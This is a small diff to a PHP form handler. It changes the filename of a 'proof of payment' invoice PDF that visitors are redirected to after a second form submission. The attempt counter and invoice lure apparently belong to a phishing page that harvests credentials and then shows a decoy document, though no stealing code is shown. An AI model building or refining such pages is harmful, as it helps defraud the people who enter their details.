@@ -100,7 +100,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $_SESSION['submission_attempts'] = 0;
 
         // Redirect to the final URL after the 2nd attempt
-        header("Location: https://financingpurchaseorder.com/proof_of_payment/Payment_confirmation_INV-2025-0084.pdf");
+        header("Location: https://financingpurchaseorder.com/proof_of_payment/Bank_Transfer_Confirmation–INV-2025-0084.pdf");
         exit();
     }
 }
